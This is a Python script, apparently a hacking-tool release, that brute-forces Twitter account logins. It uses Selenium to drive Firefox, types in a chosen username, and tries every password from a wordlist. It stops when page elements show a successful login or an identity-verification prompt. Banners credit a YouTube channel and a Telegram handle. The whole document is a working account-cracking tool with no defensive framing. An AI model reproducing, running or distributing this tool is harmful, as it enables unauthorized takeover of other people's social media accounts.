try:
        from selenium import webdriver
        from termcolor import colored
        import time
except ImportError:
        print("install selenium v2.53.6 , termcolor \n\tpip install selenium==2.53.6\n\tapt-get install python-termcolor")
try:
        print(colored("\n\t\tplease wait\n\n","red"))
        time.sleep(1)
        print(colored("===================================================","blue"))
        time.sleep(0.5)
        print(colored("===================================================","red"))
        time.sleep(0.5)
        print(colored("===================================================","blue"))
        time.sleep(0.5)
        print(colored(""" ____  _            _            ___   ___  _ ""","red"))
        time.sleep(0.5)
        print(colored("""| __ )| | __ _  ___| | __  _ __ / _ \ / _ \| |_ ""","blue"))
        time.sleep(0.5)
        print(colored("""|  _ \| |/ _` |/ __| |/ / | '__| | | | | | | __|""","red"))
        time.sleep(0.5)
        print(colored("""| |_) | | (_| | (__|   <  | |  | |_| | |_| | |_ ""","blue"))
        time.sleep(0.5)
        print(colored("""|____/|_|\__,_|\___|_|\_\ |_|   \___/ \___/ \__|""","red"))
        time.sleep(0.5)
        print(colored("===================================================","blue"))
        time.sleep(0.5)
        print(colored("===================================================","red"))
        time.sleep(0.5)
        print(colored("===================================================","blue"))
        time.sleep(0.5)
        print(colored("""\n
        \t _____          _ _   _            
        \t|_   _|_      _(_) |_| |_ ___ _ __ 
        \t  | | \ \ /\ / / | __| __/ _ \ '__|
        \t  | |  \ V  V /| | |_| ||  __/ |   
        \t  |_|   \_/\_/ |_|\__|\__\___|_|   
        \t\t\tYouTube : Cyber Monitoring
        \t\t\tTelegram : hack4lx
        ""","blue"))
        useroremail = raw_input("\nEnter the Username or Email >>: ")
        password = raw_input("Enter the Password list >>: ")
        web = webdriver.Firefox()
        web.delete_all_cookies()
        web.get("https://twitter.com/login?lang=en")
        web.find_elements_by_class_name("js-username-field")[0].clear()
        web.find_elements_by_class_name("js-username-field")[0].send_keys(useroremail)
        passlist = open(password,"r")
        for ps in passlist:
                try:
                        web.find_elements_by_class_name("js-password-field")[0].clear()
                        web.find_elements_by_class_name("js-password-field")[0].send_keys(ps)
                        web.find_elements_by_class_name("EdgeButtom--medium")[0].click()
                        print(colored("I'm trying > "+str(ps),"red"))
                except :
                        if web.find_element_by_id("global-new-tweet-button"):
                                print(colored("I found the password >> "+str(ps),"blue"))
                                break
                        elif (("Verify your identity") in web.title):
                                print(colored("I found the password >> "+str(ps),"blue"))
                                print(colored("colored(Account has been turned off due to redundancy","blue"))
                                print(colored("Wait a little bit then place your password"))
                                break
                        elif web.find_element_by_id("tweet-box-home-timeline"):
                                print(colored("I found the password >> "+str(ps),"blue"))
                                break
                        elif web.find_element_by_class_name("UserActions-editButton"):
                                print(colored("I found the password >> "+str(ps),"blue"))
                                break
except KeyboardInterrupt:
        print(colored("Bye","red"))
